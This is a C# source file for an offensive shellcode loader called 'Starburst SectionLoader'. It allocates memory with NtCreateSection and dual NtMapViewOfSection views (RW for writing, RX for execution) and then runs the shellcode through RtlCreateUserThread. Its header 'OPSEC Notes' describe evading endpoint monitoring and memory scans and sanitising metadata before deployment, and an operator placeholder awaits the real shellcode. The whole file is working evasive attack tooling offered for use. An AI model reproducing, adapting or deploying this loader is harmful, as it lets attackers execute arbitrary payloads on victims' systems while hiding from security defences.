// ============================================================================
// Starburst C# Section Loader - NtCreateSection + NtMapViewOfSection
// ============================================================================
// Compile: csc /unsafe /out:sectionloader.exe SectionLoader.cs
// Usage:   sectionloader.exe [shellcode.bin]
//          If no argument, uses embedded shellcode byte array.
// OPSEC Notes:
//   - Avoids VirtualAlloc entirely - uses section objects for allocation.
//   - NtCreateSection + NtMapViewOfSection is a less-monitored allocation
//     pattern compared to VirtualAlloc.
//   - Maps section as RW, copies shellcode, then remaps as RX.
//   - Section-backed memory pages appear different in memory scans than
//     privately-allocated pages.
//   - Still uses ntdll exports which may be hooked - consider DInvoke.cs
//     for full hook evasion.
//   - .NET assembly metadata should be sanitized before deployment.
//   - The dual-mapping technique (RW write view + RX execute view) provides
//     better evasion than single-allocation approaches.
// ============================================================================

using System;
using System.IO;
using System.Runtime.InteropServices;

namespace Starburst
{
    class SectionLoader
    {
        // --- NT API structures ---
        [StructLayout(LayoutKind.Sequential)]
        struct LARGE_INTEGER
        {
            public long QuadPart;
        }

        // --- NT API imports from ntdll ---
        [DllImport("ntdll.dll", SetLastError = true)]
        static extern uint NtCreateSection(
            out IntPtr SectionHandle,
            uint DesiredAccess,
            IntPtr ObjectAttributes,
            ref LARGE_INTEGER MaximumSize,
            uint SectionPageProtection,
            uint AllocationAttributes,
            IntPtr FileHandle
        );

        [DllImport("ntdll.dll", SetLastError = true)]
        static extern uint NtMapViewOfSection(
            IntPtr SectionHandle,
            IntPtr ProcessHandle,
            ref IntPtr BaseAddress,
            IntPtr ZeroBits,
            UIntPtr CommitSize,
            ref LARGE_INTEGER SectionOffset,
            ref UIntPtr ViewSize,
            uint InheritDisposition,
            uint AllocationType,
            uint Win32Protect
        );

        [DllImport("ntdll.dll", SetLastError = true)]
        static extern uint NtUnmapViewOfSection(
            IntPtr ProcessHandle,
            IntPtr BaseAddress
        );

        [DllImport("ntdll.dll", SetLastError = true)]
        static extern uint NtClose(IntPtr Handle);

        [DllImport("ntdll.dll")]
        static extern uint RtlCreateUserThread(
            IntPtr ProcessHandle,
            IntPtr SecurityDescriptor,
            bool CreateSuspended,
            uint StackZeroBits,
            IntPtr StackReserved,
            IntPtr StackCommit,
            IntPtr StartAddress,
            IntPtr StartParameter,
            out IntPtr ThreadHandle,
            IntPtr ClientId
        );

        [DllImport("kernel32.dll")]
        static extern IntPtr GetCurrentProcess();

        [DllImport("kernel32.dll", SetLastError = true)]
        static extern uint WaitForSingleObject(IntPtr hHandle, uint dwMilliseconds);

        [DllImport("kernel32.dll", SetLastError = true)]
        static extern bool CloseHandle(IntPtr hObject);

        // Constants
        const uint SECTION_MAP_READ = 0x0004;
        const uint SECTION_MAP_WRITE = 0x0002;
        const uint SECTION_MAP_EXECUTE = 0x0008;
        const uint SECTION_ALL_ACCESS = 0x000F001F;
        const uint PAGE_READWRITE = 0x04;
        const uint PAGE_EXECUTE_READ = 0x20;
        const uint SEC_COMMIT = 0x08000000;
        const uint INFINITE = 0xFFFFFFFF;
        const uint STATUS_SUCCESS = 0x00000000;
        const uint ViewUnmap = 2; // InheritDisposition

        // --- OPERATOR: Replace with actual shellcode bytes if not loading from file ---
        static byte[] embeddedShellcode = new byte[] {
            0xfc, 0x48, 0x83, 0xe4, 0xf0  // PLACEHOLDER - replace with real shellcode
        };

        static void Main(string[] args)
        {
            byte[] shellcode;

            if (args.Length > 0 && File.Exists(args[0]))
            {
                try
                {
                    shellcode = File.ReadAllBytes(args[0]);
                }
                catch (Exception ex)
                {
                    Console.Error.WriteLine("Error reading shellcode file: " + ex.Message);
                    return;
                }
            }
            else
            {
                shellcode = embeddedShellcode;
            }

            if (shellcode == null || shellcode.Length == 0)
            {
                Console.Error.WriteLine("Error: No shellcode to execute");
                return;
            }

            IntPtr currentProcess = GetCurrentProcess();

            // Create a section object large enough for the shellcode
            LARGE_INTEGER sectionSize = new LARGE_INTEGER();
            sectionSize.QuadPart = shellcode.Length;

            IntPtr sectionHandle;
            uint status = NtCreateSection(
                out sectionHandle,
                SECTION_ALL_ACCESS,
                IntPtr.Zero,
                ref sectionSize,
                PAGE_EXECUTE_READ,
                SEC_COMMIT,
                IntPtr.Zero
            );

            if (status != STATUS_SUCCESS)
            {
                Console.Error.WriteLine("Error: NtCreateSection failed (0x" + status.ToString("X8") + ")");
                return;
            }

            // Map a RW view of the section for writing shellcode
            IntPtr rwAddress = IntPtr.Zero;
            LARGE_INTEGER sectionOffset = new LARGE_INTEGER();
            UIntPtr viewSize = new UIntPtr((uint)shellcode.Length);

            status = NtMapViewOfSection(
                sectionHandle,
                currentProcess,
                ref rwAddress,
                IntPtr.Zero,
                UIntPtr.Zero,
                ref sectionOffset,
                ref viewSize,
                ViewUnmap,
                0,
                PAGE_READWRITE
            );

            if (status != STATUS_SUCCESS)
            {
                Console.Error.WriteLine("Error: NtMapViewOfSection (RW) failed (0x" + status.ToString("X8") + ")");
                NtClose(sectionHandle);
                return;
            }

            // Map a separate RX view of the same section for execution
            IntPtr rxAddress = IntPtr.Zero;
            viewSize = new UIntPtr((uint)shellcode.Length);
            sectionOffset.QuadPart = 0;

            status = NtMapViewOfSection(
                sectionHandle,
                currentProcess,
                ref rxAddress,
                IntPtr.Zero,
                UIntPtr.Zero,
                ref sectionOffset,
                ref viewSize,
                ViewUnmap,
                0,
                PAGE_EXECUTE_READ
            );

            if (status != STATUS_SUCCESS)
            {
                Console.Error.WriteLine("Error: NtMapViewOfSection (RX) failed (0x" + status.ToString("X8") + ")");
                NtUnmapViewOfSection(currentProcess, rwAddress);
                NtClose(sectionHandle);
                return;
            }

            // Copy shellcode to the RW view - it is simultaneously visible in the RX view
            Marshal.Copy(shellcode, 0, rwAddress, shellcode.Length);

            // Clear shellcode from managed memory
            Array.Clear(shellcode, 0, shellcode.Length);

            // Unmap the RW view - we no longer need write access
            NtUnmapViewOfSection(currentProcess, rwAddress);

            // Execute shellcode from the RX view
            IntPtr threadHandle;
            status = RtlCreateUserThread(
                currentProcess,
                IntPtr.Zero,
                false,
                0,
                IntPtr.Zero,
                IntPtr.Zero,
                rxAddress,
                IntPtr.Zero,
                out threadHandle,
                IntPtr.Zero
            );

            if (status != STATUS_SUCCESS)
            {
                Console.Error.WriteLine("Error: RtlCreateUserThread failed (0x" + status.ToString("X8") + ")");
                NtUnmapViewOfSection(currentProcess, rxAddress);
                NtClose(sectionHandle);
                return;
            }

            // Wait for thread to complete
            WaitForSingleObject(threadHandle, INFINITE);

            // Cleanup
            CloseHandle(threadHandle);
            NtUnmapViewOfSection(currentProcess, rxAddress);
            NtClose(sectionHandle);
        }
    }
}
